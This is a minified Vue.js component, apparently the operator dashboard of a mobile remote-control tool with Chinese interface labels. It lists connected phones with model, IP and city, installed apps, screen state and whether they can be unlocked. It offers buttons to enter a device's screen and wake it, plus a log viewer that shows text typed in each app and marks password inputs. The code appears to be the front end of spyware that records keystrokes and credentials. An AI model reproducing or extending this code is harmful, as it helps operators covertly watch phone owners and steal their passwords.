import{u as T}from"./useView.2c586aec.js";import{_,b as V}from"./index.6b1e63f3.js";import H from"./detail.5841063c.js";import{d as K,a as O,e as w,$ as j,U as A,N as C,r as s,y as R,t as p,A as h,E as o,F as l,J as S,I,u as E,H as r,G as c,O as W,z as k,B as u,a3 as B,L as $,f as q}from"./vlib.0bb5c6cc.js";import"./lodash.8cc0d8b0.js";import"./monacoeditor.d62c48b5.js";import"./lib.aa75605a.js";const G=K({components:{DeviceDetail:H},setup(){const t=O({post:!0,getDataListURL:"/device/page",getDataListIsPage:!0,installAppFilter:[],dataForm:{deviceId:"",pkg:"",phone:"",model:"",language:"",brand:"",installApp:"",status:""}}),e=w(""),n=w(!1),v=w(!1),m=w([]),b=w(""),g=w(""),d=w(null),f=w({deviceId:"",pkg:""});return{...T(t),...j(t),deviceId:e,inputLogVisible:n,logLoading:v,inputLogList:m,queryDate:b,queryAppPkg:g,querySource:d,currentDevice:f}},async mounted(){await this.fetchInstallAppFilterList()},methods:{enterScreen(t){this.deviceId=t.deviceId,this.$refs.deviceDetail.show(t)},async fetchInstallAppFilterList(){let{code:t,data:e,msg:n}=await V.post("/device/installAppFilterList");t==0?this.installAppFilter=e:A.alert(n,"\u9519\u8BEF",{type:"error",confirmButtonText:"OK"})},async wakeup(t){let{code:e,data:n,msg:v}=await V.post("/device/wakeup",{id:t.id});e==0?(C({message:"\u64CD\u4F5C\u6210\u529F,\u7B49\u5F85\u5524\u9192!",type:"success"}),this.getDataList()):A.alert(v,"\u9519\u8BEF",{type:"error",confirmButtonText:"OK"})},async showInputLog(t){this.currentDevice.deviceId=t.deviceId,this.currentDevice.pkg=t.pkg,this.queryAppPkg="",this.querySource=null;const e=new Date;this.queryDate=e.getFullYear()+"-"+String(e.getMonth()+1).padStart(2,"0")+"-"+String(e.getDate()).padStart(2,"0"),this.inputLogVisible=!0,this.inputLogList=[],await this.refreshLog()},async refreshLog(){if(!this.currentDevice.deviceId||!this.currentDevice.pkg||!this.queryDate){C({message:"\u67E5\u8BE2\u53C2\u6570\u4E0D\u5B8C\u6574",type:"warning"});return}this.logLoading=!0,this.inputLogList=[];try{const t=new Date(this.queryDate),e=new Date(t.getFullYear(),t.getMonth(),t.getDate()).getTime(),n=new Date(t.getFullYear(),t.getMonth(),t.getDate()+1).getTime()-1,{code:v,data:m,msg:b}=await V.post("/inputTextRecord/group",{deviceId:this.currentDevice.deviceId,startTime:e,endTime:n,pkg:this.currentDevice.pkg,appPkg:this.queryAppPkg||void 0,source:this.querySource!==null?this.querySource:void 0});v==0?m&&m.items&&Array.isArray(m.items)?this.inputLogList=m.items:this.inputLogList=[]:C({message:b||"\u83B7\u53D6\u65E5\u5FD7\u5931\u8D25",type:"error"})}catch{C({message:"\u83B7\u53D6\u65E5\u5FD7\u5931\u8D25",type:"error"})}finally{this.logLoading=!1}},onDateChange(){},formatTime(t){if(!t)return"";const e=Number(t);if(isNaN(e))return"";const n=new Date(e);if(isNaN(n.getTime()))return"";const v=n.getFullYear(),m=String(n.getMonth()+1).padStart(2,"0"),b=String(n.getDate()).padStart(2,"0"),g=String(n.getHours()).padStart(2,"0"),d=String(n.getMinutes()).padStart(2,"0"),f=String(n.getSeconds()).padStart(2,"0");return`${v}-${m}-${b} ${g}:${d}:${f}`}}}),J={class:"mod-sys__log-operation"},Q={class:"action-buttons"},X={class:"log-header"},Z={class:"header-row"},ee={class:"query-controls"},te={class:"log-content"},ae={class:"log-content-row"},oe={class:"log-time"},le={class:"log-app"},re={key:0,class:"log-resource"},ne={class:"log-text"},ue={key:0,class:"no-data"};function ie(t,e,n,v,m,b){const g=s("el-input"),d=s("el-form-item"),f=s("el-option"),L=s("el-select"),y=s("el-button"),N=s("el-form"),i=s("el-table-column"),D=s("el-tag"),z=s("el-table"),P=s("el-pagination"),U=s("DeviceDetail"),Y=s("el-date-picker"),M=s("el-dialog"),x=R("loading");return p(),h("div",J,[o(N,{inline:!0,model:t.dataForm,onKeyup:e[8]||(e[8]=W(a=>t.getDataList(),["enter"]))},{default:l(()=>[o(d,null,{default:l(()=>[o(g,{modelValue:t.dataForm.deviceId,"onUpdate:modelValue":e[0]||(e[0]=a=>t.dataForm.deviceId=a),placeholder:"\u8BBE\u5907ID",clearable:""},null,8,["modelValue"])]),_:1}),o(d,null,{default:l(()=>[o(g,{modelValue:t.dataForm.pkg,"onUpdate:modelValue":e[1]||(e[1]=a=>t.dataForm.pkg=a),placeholder:"\u6240\u5C5E\u5305",clearable:""},null,8,["modelValue"])]),_:1}),o(d,null,{default:l(()=>[o(g,{modelValue:t.dataForm.model,"onUpdate:modelValue":e[2]||(e[2]=a=>t.dataForm.model=a),placeholder:"\u624B\u673A\u578B\u53F7",clearable:""},null,8,["modelValue"])]),_:1}),o(d,null,{default:l(()=>[o(g,{modelValue:t.dataForm.language,"onUpdate:modelValue":e[3]||(e[3]=a=>t.dataForm.language=a),placeholder:"\u8BED\u8A00",clearable:""},null,8,["modelValue"])]),_:1}),o(d,null,{default:l(()=>[o(g,{modelValue:t.dataForm.brand,"onUpdate:modelValue":e[4]||(e[4]=a=>t.dataForm.brand=a),placeholder:"\u54C1\u724C",clearable:""},null,8,["modelValue"])]),_:1}),o(d,null,{default:l(()=>[o(L,{filterable:"",modelValue:t.dataForm.installApp,"onUpdate:modelValue":e[5]||(e[5]=a=>t.dataForm.installApp=a),placeholder:"\u5DF2\u5B89\u88C5APP",clearable:""},{default:l(()=>[(p(!0),h(S,null,I(t.installAppFilter,a=>(p(),E(f,{key:a.packageName,label:`${a.appName}(${a.packageName})`,value:a.packageName},null,8,["label","value"]))),128))]),_:1},8,["modelValue"])]),_:1}),o(d,null,{default:l(()=>[o(L,{modelValue:t.dataForm.status,"onUpdate:modelValue":e[6]||(e[6]=a=>t.dataForm.status=a),placeholder:"\u72B6\u6001"},{default:l(()=>[o(f,{label:"\u7184\u5C4F",value:0}),o(f,{label:"\u4EAE\u5C4F",value:1})]),_:1},8,["modelValue"])]),_:1}),o(d,null,{default:l(()=>[o(y,{onClick:e[7]||(e[7]=a=>t.getDataList())},{default:l(()=>[r(c(t.$t("query")),1)]),_:1})]),_:1})]),_:1},8,["model"]),k((p(),E(z,{data:t.dataList,border:"",onSortChange:t.dataListSortChangeHandle,style:{width:"100%"}},{default:l(()=>[o(i,{prop:"deviceId",label:"\u8BBE\u5907ID","header-align":"center",align:"center","show-overflow-tooltip":""}),o(i,{prop:"pkg",label:"\u6240\u5C5E\u5305","header-align":"center",align:"center","show-overflow-tooltip":""}),o(i,{prop:"brand",label:"\u54C1\u724C","header-align":"center",align:"center",width:"80px","show-overflow-tooltip":!0}),o(i,{prop:"model",label:"\u624B\u673A\u578B\u53F7","header-align":"center",align:"center",width:"80px","show-overflow-tooltip":""}),o(i,{prop:"language",label:"\u8BED\u8A00","header-align":"center",align:"center",width:"60px","show-overflow-tooltip":""}),o(i,{prop:"systemVersion",label:"\u7CFB\u7EDF\u7248\u672C","header-align":"center",align:"center",width:"80px","show-overflow-tooltip":""}),o(i,{prop:"sdkVersion",label:"sdk\u7248\u672C","header-align":"center",align:"center",width:"80px","show-overflow-tooltip":!0}),o(i,{label:"\u5C4F\u5E55\u5206\u8FA8\u7387","header-align":"center",align:"center",width:"100px","show-overflow-tooltip":!0},{default:l(a=>[r(c(`${a.row.screenWidth}\xD7${a.row.screenHeight}`),1)]),_:1}),o(i,{prop:"ip",label:"IP/\u57CE\u5E02","header-align":"center",align:"center",width:"200px","show-overflow-tooltip":!0},{default:l(a=>[r(c(a.row.ip)+" / "+c(a.row.addr),1)]),_:1}),o(i,{label:"\u8BBE\u5907\u72B6\u6001","header-align":"center",align:"left",width:"150px"},{default:l(a=>[u("div",null,[e[16]||(e[16]=r(" \u53EF\u89E3\u9501 ")),a.row.lockScreen?(p(),E(D,{key:0,type:"success"},{default:l(()=>e[14]||(e[14]=[r("YES")])),_:1})):(p(),E(D,{key:1,type:"danger"},{default:l(()=>e[15]||(e[15]=[r("NO")])),_:1}))]),u("div",null,[e[21]||(e[21]=r(" \u72B6\u6001 ")),k(o(D,{type:"danger"},{default:l(()=>e[17]||(e[17]=[r("\u7184\u5C4F")])),_:2},1536),[[B,a.row.status==0]]),k(o(D,{type:"success"},{default:l(()=>e[18]||(e[18]=[r("\u4EAE\u5C4F")])),_:2},1536),[[B,a.row.status==1]]),k(o(D,{type:"info"},{default:l(()=>e[19]||(e[19]=[r("\u7B49\u5F85\u5524\u9192")])),_:2},1536),[[B,a.row.status==2]]),k(o(D,{type:"info"},{default:l(()=>e[20]||(e[20]=[r("\u7B49\u5F85\u5524\u9192")])),_:2},1536),[[B,a.row.status==3]])])]),_:1}),o(i,{prop:"lastHeart",label:"\u6700\u540E\u6D3B\u52A8\u65F6\u95F4","header-align":"center",align:"center",width:"150px","show-overflow-tooltip":!0}),o(i,{prop:"remark",label:"\u5907\u6CE8","show-overflow-tooltip":"","header-align":"center",align:"center",width:"150px"}),o(i,{label:t.$t("handle"),"header-align":"center",align:"center",width:"260px",fixed:"right"},{default:l(a=>[u("div",Q,[o(y,{type:"primary",link:"",onClick:F=>t.enterScreen(a.row)},{default:l(()=>e[22]||(e[22]=[r("\u8FDB\u5165")])),_:2},1032,["onClick"]),o(y,{type:"primary",link:"",onClick:F=>t.wakeup(a.row)},{default:l(()=>e[23]||(e[23]=[r("\u5524\u9192")])),_:2},1032,["onClick"]),o(y,{type:"primary",link:"",onClick:F=>t.showInputLog(a.row)},{default:l(()=>e[24]||(e[24]=[r("\u8F93\u5165\u8BB0\u5F55")])),_:2},1032,["onClick"]),o(y,{type:"primary",link:""},{default:l(()=>e[25]||(e[25]=[r("\u5907\u6CE8")])),_:1})])]),_:1},8,["label"])]),_:1},8,["data","onSortChange"])),[[x,t.dataListLoading]]),o(P,{"current-page":t.page,"page-sizes":[10,20,50,100],"page-size":t.limit,total:t.total,layout:"total, sizes, prev, pager, next, jumper",onSizeChange:t.pageSizeChangeHandle,onCurrentChange:t.pageCurrentChangeHandle},null,8,["current-page","page-size","total","onSizeChange","onCurrentChange"]),o(U,{ref:"deviceDetail",onWakeup:t.wakeup},null,8,["onWakeup"]),o(M,{modelValue:t.inputLogVisible,"onUpdate:modelValue":e[13]||(e[13]=a=>t.inputLogVisible=a),title:`\u8F93\u5165\u65E5\u5FD7 - \u8BBE\u5907ID: ${t.currentDevice.deviceId} \u5305\u540D: ${t.currentDevice.pkg}`,width:"900px","close-on-click-modal":!1,class:"input-log-dialog"},{footer:l(()=>[o(y,{onClick:e[12]||(e[12]=a=>t.inputLogVisible=!1)},{default:l(()=>e[30]||(e[30]=[r("\u5173\u95ED")])),_:1})]),default:l(()=>[u("div",X,[u("div",Z,[u("div",ee,[e[27]||(e[27]=u("span",{class:"query-label"},"\u6765\u6E90:",-1)),o(L,{modelValue:t.querySource,"onUpdate:modelValue":e[9]||(e[9]=a=>t.querySource=a),placeholder:"\u9009\u62E9\u6765\u6E90",clearable:"",style:{width:"120px"}},{default:l(()=>[o(f,{label:"\u7BA1\u7406\u7AEF",value:1}),o(f,{label:"App\u7AEF",value:0})]),_:1},8,["modelValue"]),e[28]||(e[28]=u("span",{class:"query-label"},"APP\u5305\u540D:",-1)),o(g,{modelValue:t.queryAppPkg,"onUpdate:modelValue":e[10]||(e[10]=a=>t.queryAppPkg=a),placeholder:"\u8F93\u5165APP\u5305\u540D",clearable:"",style:{width:"200px"}},null,8,["modelValue"]),e[29]||(e[29]=u("span",{class:"query-label"},"\u67E5\u8BE2\u65E5\u671F:",-1)),o(Y,{modelValue:t.queryDate,"onUpdate:modelValue":e[11]||(e[11]=a=>t.queryDate=a),type:"date",placeholder:"\u9009\u62E9\u67E5\u8BE2\u65E5\u671F",format:"YYYY-MM-DD","value-format":"YYYY-MM-DD",onChange:t.onDateChange,style:{width:"160px"}},null,8,["modelValue","onChange"]),o(y,{type:"primary",onClick:t.refreshLog,loading:t.logLoading,size:"small"},{default:l(()=>e[26]||(e[26]=[r(" \u91CD\u65B0\u67E5\u8BE2 ")])),_:1},8,["onClick","loading"])])])]),k((p(),h("div",te,[(p(!0),h(S,null,I(t.inputLogList,(a,F)=>(p(),h("div",{class:$(["log-item",{"password-item":a.password==1}]),key:F},[u("div",ae,[u("span",oe,c(a.date||t.formatTime(a.time)),1),u("span",{class:$(["log-source",{"source-admin":a.source==1,"source-app":a.source==0}])},c(a.source==1?"\u7BA1\u7406\u7AEF":"App\u7AEF"),3),u("span",le,c(a.app),1),a.resourceId?(p(),h("span",re,c(a.resourceId),1)):q("",!0),u("span",ne,c(a.text||(a.password==1?"[\u5BC6\u7801\u8F93\u5165]":"\u65E0\u5185\u5BB9")),1)])],2))),128)),t.inputLogList.length===0&&!t.logLoading?(p(),h("div",ue," \u6682\u65E0\u8F93\u5165\u65E5\u5FD7\u6570\u636E ")):q("",!0)])),[[x,t.logLoading]])]),_:1},8,["modelValue","title"])])}var ve=_(G,[["render",ie],["__scopeId","data-v-59456c86"]]);export{ve as default};
